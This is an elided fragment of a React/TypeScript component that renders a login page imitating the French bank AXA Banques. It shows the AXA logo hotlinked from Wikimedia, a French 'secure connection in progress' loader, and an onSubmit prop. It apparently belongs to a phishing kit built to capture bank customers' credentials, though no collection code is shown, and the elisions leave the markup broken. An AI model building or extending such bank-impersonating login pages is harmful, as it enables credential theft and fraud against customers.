...
export function AxaBanquesAuthTemplate({ onSubmit }: AxaBanquesAuthTemplateProps) {
  ...
  if (showLoader) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-blue-500 to-blue-600 pt-20">
          ...
          <div className="bg-white rounded-2xl shadow-xl p-8">
            <div className="flex flex-col items-center justify-center py-16">
              ...
              <p className="text-gray-600 text-center max-w-md">
                Connexion sécurisée à votre espace AXA Banques en cours.
              </p>
            </div>
          </div>
        </div>
          ...
          <div className="max-w-md mx-auto w-full">
            ...
            <div className="flex items-center justify-between mb-8">
              <div className="flex items-center">
                <img 
                  src="https://upload.wikimedia.org/wikipedia/fr/thumb/b/b1/Logo_AXA_2014.svg/1200px-Logo_AXA_2014.svg.png" 
                  alt="AXA Banques" 
                  className="h-8"
                />
              </div>
        ...
        <div className="bg-gradient-to-br from-blue-500 to-blue-600 p-4 lg:p-8 flex flex-col justify-center text-white">
          <div className="max-w-md mx-auto w-full">
            ...
            <div className="text-blue-100 text-sm space-y-2">
              <p>• Banque et assurance intégrées</p>
